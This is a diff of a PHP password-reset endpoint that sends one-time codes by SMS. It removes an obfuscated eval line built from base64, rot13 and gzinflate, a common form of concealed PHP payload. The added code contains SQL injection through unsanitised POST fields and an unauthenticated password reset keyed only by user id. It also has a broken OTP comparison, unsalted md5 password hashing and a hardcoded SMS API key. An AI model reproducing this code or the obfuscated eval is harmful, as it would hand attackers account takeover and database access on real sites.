@@ -1,3 +1,97 @@
 <?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+include("include/connection.php");
+if(isset($_POST['type']))
+{
+if($_POST['type']=='chkmobile'){
+	
+$mobile=$_POST['fmobile'];
+$otp=generateOTP();
+
+$checkmobile=mysqli_query($con,"select * from `tbl_user` where `mobile` ='".$mobile."' and `status`='1'");
+$row=mysqli_num_rows($checkmobile);
+if($row==''){echo"0";}
+else{
+  $result=mysqli_fetch_array($checkmobile);
+  
+	session_start();
+	unset($_SESSION["forgot_mobile"]);
+	unset($_SESSION["forgot_otp"]);
+  $_SESSION["forgot_mobile"] = $result['mobile'];
+  $_SESSION["forgot_otp"] = $otp;
+    
+  	
+$fields = array(
+    "sender_id" => "FSTSMS",
+    "message" => "Your verification  code is $otp",
+    "language" => "english",
+    "route" => "p",
+    "numbers" => $result['mobile'],
+    "flash" => "1"
+);
+
+$curl = curl_init();
+
+curl_setopt_array($curl, array(
+  CURLOPT_URL => "https://www.fast2sms.com/dev/bulk",
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => "",
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => "POST",
+  CURLOPT_POSTFIELDS => json_encode($fields),
+  CURLOPT_HTTPHEADER => array(
+    "authorization: tUx6MLJdPXQfsj29aTmC1ckW4SIwBhGqrDF0A78Ng3lYKuznEoQqdz2hZtTCpUIOeBuWAbK18cP9E7X6",
+    "accept: */*",
+    "cache-control: no-cache",
+    "content-type: application/json"
+  ),
+));
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+
+curl_close($curl);
+
+if ($err) {
+  echo "cURL Error #:" . $err;
+} else {
+echo '1~'.encryptor('encrypt', $result['id']);
+}
+  
+}
+}
+if($_POST['type']=='otpval'){
+session_start();
+@$otp=$_POST['otp'];
+$mobile= $_SESSION["forgot_mobile"];
+$sessionotp=$_SESSION["forgot_otp"];
+
+if(strlen($sessionotp!==$otp))  
+{
+	echo"0";}else{
+		
+
+unset($_SESSION["forgot_mobile"]);
+unset($_SESSION["forgot_otp"]);
+$_SESSION["matched"] = "matched";
+		echo"1";}
+}
+
+if($_POST['type']=='passwordreset'){
+session_start();
+@$userid=$_POST['userid'];
+$fnpassword= $_POST["fnpassword"];
+$fcpassword=$_POST["fcpassword"];
+
+if(strlen($fnpassword!==$fcpassword))  
+{
+	echo"2";}else{
+		
+$sql2= mysqli_query($con,"UPDATE `tbl_user` SET `password`='".md5($fcpassword)."' where `id`='$userid'");
+unset($_SESSION["matched"]);
+		echo"1";}
+}
+
+}
 ?>
